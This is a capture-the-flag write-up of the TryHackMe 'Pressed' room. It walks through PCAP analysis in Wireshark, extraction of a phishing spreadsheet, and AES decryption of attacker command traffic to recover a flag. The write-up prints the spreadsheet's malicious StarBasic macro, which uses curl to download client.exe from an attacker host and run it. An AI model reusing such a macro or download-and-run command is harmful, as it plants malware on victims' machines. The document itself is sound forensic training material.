<h1 align="center">Pressed</h1>
<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/8b7b3986-9a26-40dc-95de-8adb373b7f0c"><br>
2025, September 7<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
and I’m excited to join you on this adventure, part of my <code>489</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>
<em>A full-scale intrusion was recently detected within the network, raising critical alarms</em>.<br>
Access it <a href="https://tryhackme.com/room/pressedroom"</a>here.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/5cbc875e-e193-45cb-9474-ad5d8f498db3"></p>

<h2>Task 1 . Solve the case</h2>
<p>A full-scale intrusion was recently detected within the network, raising critical alarms. Fortunately, a packet capture (PCAP) was recorded during the incident, capturing the attacker's initial entry and subsequent actions.<br>

Your task is to analyse the traffic, identify how the attacker gained access, and uncover the sequence of malicious activity. Reconstruct the attack timeline and determine the final impact by finding the attacker's objective hidden within the captured data.<br>

Press the green Start Machine button at the top of this task to start the virtual machine (VM). The VM will start in <code>split-screen view</code>; if the split-screen is not visible, press the Show Split View button at the top of the page.<br>

The PCAP file can be located on the Desktop of the VM.<br>

The VM has all the tools necessary to complete the challenge. If you wish to use the AttackBox, you can download the PCAP file via  <code>http://MACHINE_IP:8000/traffic.pcapng</code>.<br>

PCAP MD5: <code>0d0027855661b4eb8a9d3c52eec370c7</code><br>

The flag is <code>base64 encoded</code> and divided into three parts.<br>

Note: If in <code>split-screen view</code>, you see the Dock panel in the middle of the screen; you can click on the MATE Tweak icon on the Desktop. Select Panel, and un-check Enable Dock. You can then check the option to re-enable it, and it will fix its position to the far right.</p>

<p><em>Answer the questiona below</em></p>

<br>
<br>
<h2>Expert Information</h2>

<img width="1691" height="511" alt="image" src="https://github.com/user-attachments/assets/c0921d31-47a6-49f4-a870-5c60c1dabc4d" />

<br>
<br>
<br>
<h2>Statistics Endpoints</h2>

<p>IPv4</p>

<img width="1729" height="178" alt="image" src="https://github.com/user-attachments/assets/13e3f781-3c44-444d-85ed-5f33f91bf22a" />

<br>
<br>
<br>
<p>TCP</p>

<img width="1734" height="186" alt="image" src="https://github.com/user-attachments/assets/ea4ed973-db86-42a7-9ea7-c2c4f2a60465" />

<br>
<br>
<br>
<p>UDP</p>

<img width="1728" height="188" alt="image" src="https://github.com/user-attachments/assets/69ca2e4e-d2ad-43c2-aa1d-73af97a1e967" />

<br>
<br>
<br>
<h2>Statistics Protocol Hierarchy</h2>

<h3>SMTP, Simple Message Transfer Protocol</h3>

<img width="1729" height="454" alt="image" src="https://github.com/user-attachments/assets/7f438aae-0369-455d-b983-f7ee021fa930" />


<br>
<h3>IMF, Information Message Format</h3>

<p align="center">Frame <strong>1</strong> IMF packet<br><img width="1200px" src="https://github.com/user-attachments/assets/b3c99074-fbea-46d0-b2f5-f31690c55da4" />

<br>
<br>

<p align="center"><strong>2921</strong><br><img width="1200px" src="https://github.com/user-attachments/assets/13a62aa0-c254-4ec2-9420-e05b6cc63354" />

<br>
<br>
<br>
<h2>TCP stream</code></h2>

<p align="center">Follow TCP Stream - <strong>2921</strong><br><img width="1200px" src="https://github.com/user-attachments/assets/37d1cc7c-329f-4bf6-acde-403c551c35f4" />

<br>
<br>
<p>

- MAIL<br>
- Username: hazel@pressed.thm<br>
- Password: password</p>

<img width="1689" height="633" alt="image" src="https://github.com/user-attachments/assets/c1bcbcff-8093-410c-9065-6e216b813adb" />

<br>
<br>
<p>

- copied base64 encoded excerpt<br>
- saved it to  <code>file.txt</code></p>

<img width="1690" height="631" alt="image" src="https://github.com/user-attachments/assets/bdb6b7fe-0715-4295-afdb-04c0e7f84a86" />

<br>
<br>
<h2>GET</h2>
<p>

- client.exe</p>

<img width="1692" height="410" alt="image" src="https://github.com/user-attachments/assets/664ece8a-2814-40ee-a86b-0c04c25bf1ca" />

<br>
<br>
<br>

<h2>Chipher Change</h2>

<img width="1736" height="767" alt="image" src="https://github.com/user-attachments/assets/be15e4f5-611d-4913-b53a-80545bc111a3" />

<br>
<br>
<br>
<h2>Cipher Suite</h2>

<img width="1693" height="299" alt="image" src="https://github.com/user-attachments/assets/71d4e1c3-46a9-47e5-bde8-33e0a11adc30" />


<br>
<br>
<br>

<p>
 
</p>
- saved base64 encoded data into <code>file.txt</code></p>

<img width="1735" height="764" alt="image" src="https://github.com/user-attachments/assets/fd496ef2-7816-4db5-8afb-55067b4e0569" />

<br>
<br>
<p>

- decoded <code>file.txt</code> into <code>sheet.ods</code><br>
- unziped <code>sheet.ods</code></p>

```bash
:~/Pressed#  cat file.txt | base64 -d > sheet.ods
```

```bash
:~/Pressed#  file sheet.ods
sheet.ods: OpenDocument Spreadsheet


:~/Pressed#  unzip sheet.ods
Archive:  sheet.ods
 extracting: mimetype                
  inflating: Basic/Standard/evil.xml  
  inflating: Basic/Standard/script-lb.xml  
  inflating: Basic/script-lc.xml     
  inflating: settings.xml            
   creating: Configurations2/accelerator/
   creating: Configurations2/images/Bitmaps/
   creating: Configurations2/toolpanel/
   creating: Configurations2/floater/
   creating: Configurations2/statusbar/
   creating: Configurations2/toolbar/
   creating: Configurations2/progressbar/
   creating: Configurations2/popupmenu/
   creating: Configurations2/menubar/
  inflating: styles.xml              
  inflating: manifest.rdf            
  inflating: content.xml             
  inflating: meta.xml                
 extracting: Thumbnails/thumbnail.png  
  inflating: META-INF/manifest.xml
```

```bash
:~/Pressed#  ls
script-lc.xml  Standard
```

<h4>script-lc.xml</h4>

```bash
:~/Pressed#  cat script-lc.xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE library:libraries PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "libraries.dtd">
<library:libraries xmlns:library="http://openoffice.org/2000/library" xmlns:xlink="http://www.w3.org/1999/xlink">
 <library:library library:name="Standard" library:link="false"/>
</library:libraries>
```

<h4>evil.xml</h4>
<p>

- cmd /c curl 10.13.44.207/client.exe -o C:\ProgramData\client.exe
- echo VEhNe0FfQzJfTUF5Xw==<br>
- C:\\ProgramData\\client.ex</p>

</p>

```bash
:~/Pressed# ls
evil.xml  script-lb.xml
```

```bash
:~/Pressed#  cat evil.xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd">
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="evil" script:language="StarBasic" script:moduleType="normal">Sub Main

    Shell(&quot;cmd /c curl 10.13.44.207/client.exe -o C:\ProgramData\client.exe&quot;)
    Shell(&quot;cmd /c echo VEhNe0FfQzJfTUF5Xw==&quot;)
    Shell(&quot;C:\\ProgramData\\client.exe&quot;)
    
End Sub
```

<br>
<p>1.1. What is the first part of the encoded flag value? Format: Paste the encoded value. Not the decoded value.<br>
<code>VEhNe0FfQzJfTUF5Xw==</code></p>
<br>

```bash
:~/Pressed# echo 'VEhNe0FfQzJfTUF5Xw==' | base64 -d
THM{A_C2_MAy_root@ip-10-201-26-122:~/Basic/Standard# cd ..
```

<br>
<h2>client.exe</h2>

<img width="1209" height="242" alt="image" src="https://github.com/user-attachments/assets/2ad7055c-06c7-45cf-9192-a7bef33a06ef" />

```bash
:~/Pressed#  file client.exe
client.exe: PE32+ executable (console) x86-64, for MS Windows
```

```bash
:~/Pressed#  strings client.exe > s
```

```bash
:~/Pressed#  nano s
...
GHASH for x86_64, CRYPTOGAMS by <appro@openssl.org>
...
Vector Permutation AES for x86_64/SSSE3, Mike Hamburg (Stanford University)
...
Montgomery Multiplication for x86_64, CRYPTOGAMS by <appro@openssl.org>
VWSUATAUAVAW
VWSUATAUAVAW
...
VWSUATAUAVAW
```

<h4>Ghidra</h4>

<h5>Key UTF-8</h5>
<p>
 
- A = rhI1YazJLaLVgWv4<br>
- B = VKf7EQIvl8ps6MJj<br>
- A + B = rhI1YazJLaLVgWv4VKf7EQIvl8ps6MJj</p>
<br>

<img width="1348" height="509" alt="image" src="https://github.com/user-attachments/assets/fdbb41c3-9c7c-476e-a40f-036206cec0da" />

<br>

<img width="1347" height="513" alt="image" src="https://github.com/user-attachments/assets/19a77669-6e64-42fa-a39e-faf21e820708" />

<br>
<br>
<h5>IV UTF-8</h5>
<p>
 
- pEw8P3PU9kCcG4sj</p>

<img width="1347" height="447" alt="image" src="https://github.com/user-attachments/assets/3cb1982e-f90b-4c80-8e6f-3aadeab10e10" />

<br>
<br>
<h2>Wireshark</h2>

```bash
ip.src == 10.13.44.207 && tcp.port == 443
```

<img width="1617" height="374" alt="image" src="https://github.com/user-attachments/assets/a9f1c0cf-d801-4868-a95c-2cd8d7b0864e" />

<br>

<img width="1608" height="619" alt="image" src="https://github.com/user-attachments/assets/d8d8fcdd-496c-40de-90ee-308283e6d173" />

<br>

<img width="1611" height="704" alt="image" src="https://github.com/user-attachments/assets/ba07666b-ea6c-4a0f-93f0-f79fe02a3626" />

<br>
<br>
<p>
 
- Show as <code>Raw</code><br>
- <code>Save as ...</code></p>

<img width="1075" height="856" alt="image" src="https://github.com/user-attachments/assets/feaf8271-2aa1-4d8b-bb64-735b0a546101" />

<br>
<br>

```bash
:~/Pressed#  file data.dat
data.dat: data
```

<br>
<br>
<h2>Key UTF-8</h2>
<p>
 
- rhI1YazJLaLVgWv4VKf7EQIvl8ps6MJj</code></p>

<img width="1364" height="203" alt="image" src="https://github.com/user-attachments/assets/d00018e9-d974-4235-af64-1f17fc89f432" />

<br>
<br>
<h2>Key Hex</h2>

```bash
7268493159617a4a4c614c5667577634564b6637455149766c387073364d4a6a
```

<br>
<br>
<h2>IV UTF-8</h2>

```bash
pEw8P3PU9kCcG4sj
```

<br>
<br>
<h2>IV Hex</h2>

```bash
7045773850335055396b43634734736a
```

<img width="1359" height="184" alt="image" src="https://github.com/user-attachments/assets/7298121d-af6e-470d-91ed-1555774064b7" />

<br>
<br>
<h2>AES 256</h2>

```bash
:~/Pressed#  openssl enc -aes-256-cbc -d -K 7268493159617a4a4c614c5667577634564b6637455149766c387073364d4a6a -iv 7045773850335055396b43634734736a -in data.dat -out outcome.txt
```

<p>

- whoami<br>
- administrator<br>
- RWx1RDNfWTB1X1doM25fWW91Xw==</p>

```bash
:~/Pressed# cat outcome.txt
whoami









\ufffd\ufffdWk\ufffd\ufffdzji\ufffd=\ufffd\ufffd\ufffdoadministrator
;\ufffd\ufffd-NV\ufffd\ufffd\ufffd\\ufffd\ufffdA-\ufffdttratorr RWx1RDNfWTB1X1doM25fWW91Xw== /add /YI\ufffd\ufffd\ufffd\ufffd1tLjYT\ufffdMs9\ufffdleted successfully.












\ufffdh\ufffd\ufffd\ufffd\ufffdm\ufffd1x\ufffd\ufffd\ufffd\ufffddministrators administratorr /add<\ufffd\ufffd\ufffd\ufffd^8\ufffd\ufffd\ufffdm~leted successfully.












vj|xV\2\ufffdW\ufffd#*\u059d\ufffd C has no label.op\
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\Administrator\Desktop

05/11/2025  01:21 AM    <DIR>          .
05/11/2025  01:21 AM    <DIR>          ..
05/11/2025  12:29 AM               840 clients.csv
06/21/2016  03:36 PM               527 EC2 Feedback.website
06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
               3 File(s)          1,921 bytes
               2 Dir(s)   6,116,753,408 bytes free
\ufffdl\ufffd0\ufffdVm]
TT\u06c0"ministrator\Desktop\clients.csvr\ufffdI\ufffd\ufffd\ufffd\ufffd`\ufffd\ufffd
                                             I\ufffd\ufffdrds
1,Kristina,3576458480892700
2,Vincenz,6377289692238729
3,Lynnett,502083133236470823
4,Willy,3529610352793949
5,Maryjo,5018887044140690101
6,Marigold,3562096088860871
7,Tedra,5100145340581462
8,Dita,374622610631912
9,Lilas,50184655540100116
10,Sybila,337941913325253
11,Iseabal,560224746120829081
12,Dotti,5261652156343239
13,Tessa,201879631316647
14,Adolph,374622215114868
15,Erskine,3542911130825612
16,Cyndie,3570664276667588
17,Gabriel,3545817387044384
18,Tani,3545260532217102
19,Goldie,3536353114355357
20,Ingram,630456178681475528
21,Morissa,QXJlX1ByZSRzM2RfNF9UaW0zfQ==
22,Shelia,201766968942709
23,Mikel,3558557239071912
24,Manya,3578351764405158
25,Cullen,3543833584578068
26,Rowland,201770928146237
27,Merilee,3536700865014213
28,Wiley,4911540419701894811
29,Harlin,3542950948982249
30,Michal,5462675671244662
```

<br>
<p>1.2. What is the second part of the encoded flag value? Format: Paste the encoded value. Not the decoded value.<br>
<code>RWx1RDNfWTB1X1doM25fWW91Xw==</code></p>

```bash
:~/Pressed# cat outcome.txt
...
;\ufffd\ufffd-NV\ufffd\ufffd\ufffd\\ufffd\ufffdA-\ufffdttratorr RWx1RDNfWTB1X1doM25fWW91Xw== /add /YI\ufffd\ufffd\ufffd\ufffd1tLjYT\ufffdMs9\ufffdleted successfully.
...
```

```bash
:~/Pressed# echo 'RWx1RDNfWTB1X1doM25fWW91Xw==' | base64 -d
EluD3_Y0u_Wh3n_You_
```

<br>
<p>1.3. What is the third part of the encoded flag value? Format: Paste the encoded value. Not the decoded value.<br>
<code>QXJlX1ByZSRzM2RfNF9UaW0zfQ==</code></p>

```bash
:~/Pressed# cat outcome.txt
...
21,Morissa,QXJlX1ByZSRzM2RfNF9UaW0zfQ==
...
```

```bash
:~/Pressed# echo 'QXJlX1ByZSRzM2RfNF9UaW0zfQ==' | base64 -d
Are_Pre$s3d_4_Tim3}
```

<img width="1614" height="707" alt="image" src="https://github.com/user-attachments/assets/21d21ee1-eb22-48e7-b10b-9fc55fe87a2e" />

<br>
<br>
<p>1.4. What is the flag? Format: Paste the decoded values.<br>
<code>THM{A_C2_MAy_EluD3_Y0u_Wh3n_You_Are_Pre$s3d_4_Tim3}</code></p>
<br>

<img width="1740" height="178" alt="image" src="https://github.com/user-attachments/assets/9e2f7b81-81df-4d60-a4af-56b079487ea9" />

<br>
<br>
<p>
 
- A = VEhNe0FfQzJfTUF5Xw==  :  THM{A_C2_MAy_<br>
- B = RWx1RDNfWTB1X1doM25fWW91Xw== : EluD3_Y0u_Wh3n_You_<br>
- C = QXJlX1ByZSRzM2RfNF9UaW0zfQ==  Are_Pre$s3d_4_Tim3}<br>
- A + B + C = THM{A_C2_MAy_EluD3_Y0u_Wh3n_You_Are_Pre$s3d_4_Tim3}</p>

<br>
<h2>CyberChef</h2>
<p>

- AES Decrypt recipe</p>

<img width="1735" height="244" alt="image" src="https://github.com/user-attachments/assets/52ab0148-4018-4a2a-b2b2-2bb107d3b9cc" />

<br>

<img width="1727" height="606" alt="image" src="https://github.com/user-attachments/assets/9d9c0328-7deb-4053-a6c9-f9bdadedaf39" />

<br>

<img width="1728" height="602" alt="image" src="https://github.com/user-attachments/assets/cb439774-335b-41cd-b186-01b49ed41b89" />


<br>
<br>
<br>
<h2 align="center">Completed</h2>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/90f9e6c2-dd7e-4f2e-87eb-a185420e42c9"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/94097061-113b-4f16-b043-b338df6ee583"></p>

<h2 align="center">My TryHackMe Journey</h2>


<div align="center"><h6>

| Date              | Room                                  |Streak   |   All Time   |   All Time   |   Monthly   |   Monthly  | Points   | Rooms     | Badges    |
|:------------------|:--------------------------------------|--------:|:-----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |                                       |         |    Global    |    Brazil    |   Global    |   Brazil   |          | Completed |           |
| 2025, Sep 7       |Medium 🚩 - <code><strong>Pressed</strong></code>                    | 489     |     113ʳᵈ    |     5ᵗʰ      |    508ᵗʰ   |     9ᵗʰ    | 124,886  |  948      |    73     |
| 2025, Sep 6       |Easy 🚩 - Classic Passwd               | 488     |     114ᵗʰ    |      5ᵗʰ     |     683ᵗʰ   |    12ⁿᵈ    | 124,476  |    947    |    73     |
| 2025, Sep 6       |Medium 🚩 - toc2                      | 488     |     114ᵗʰ    |      5ᵗʰ     |     695ᵗʰ   |    12ⁿᵈ    | 124,446  |    946    |    73     |
| 2025, Sep 6       |Hard 🚩 - Extract                      | 488     |     114ᵗʰ    |      5ᵗʰ     |     716ᵗʰ   |    13ʳᵈ    | 124,386  |    945    |    73     |
| 2025, Sep 6       |Medium 🚩 - Plotted-EMR                | 488     |     114ᵗʰ    |      5ᵗʰ     |     844ᵗʰ   |    12ⁿᵈ    | 124,326  |    944    |    73     |
| 2025, Sep 5       |Medium 🚩 - Inferno                    | 487     |     114ᵗʰ    |      5ᵗʰ     |     758ᵗʰ   |    12ⁿᵈ    | 124,236  |    943    |    73     |
| 2025, Sep 5       |Easy 🔗 - Psycho Break                 | 487     |     115ᵗʰ    |      5ᵗʰ     |     724ᵗʰ   |    10ᵗʰ    | 124,152  |    942    |    73     |
| 2025, Sep 4       |Medium 🔗 - IP and Domain Threat Intel | 486     |	   113ʳᵈ   |	     5ᵗʰ   	|      579ᵗʰ   |	  10ᵗʰ    |	124,018  |	  940	   |    73     |
| 2025, Sep 4       |Medium 🚩 - Cold VVars                 | 486     |     113ʳᵈ    |      5ᵗʰ     |     579ᵗʰ   |    10ᵗʰ    | 124,048  |    941    |    73     |
| 2025, Sep 3       |Easy 🔗 - Malware Classification       | 485     |     112ⁿᵈ    |      5ᵗʰ     |     714ᵗʰ   |    13ʳᵈ    | 123,882  |    939    |    73     |
| 2025, Sep 2       |Medium 🔗 - Session Forencics          | 484     |     111ˢᵗ    |      5ᵗʰ     |     706ᵗʰ   |    14ᵗʰ    | 123,786  |    938    |    73     |
| 2025, Sep 1       |Medium 🚩 - Voyage                     | 483     |     111ˢᵗ    |      5ᵗʰ     |     849ᵗʰ   |    15ᵗʰ    | 123,636  |    937    |    73     |

</h6></div><br>

<br>

<p align="center">Global All Time:   113ʳᵈ<br><img width="250px" src="https://github.com/user-attachments/assets/3b40a83d-b0ad-4075-9a3e-5b113ffebd9f"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/349d61b4-f8e5-4280-8cf0-dfd1d9b24029"><br><br>
                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/3b4753fb-92ca-4337-99d4-166819240de0"><br>
                  Global monthly:    508ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/b84172f5-3d97-46eb-92f9-121b35f95b91"><br>
                  Brazil monthly:      9ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/dbd475d5-1dbc-4d35-aede-5b77a7d75021"><br>

<h2 align="center">Thanks for coming!</h2>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>
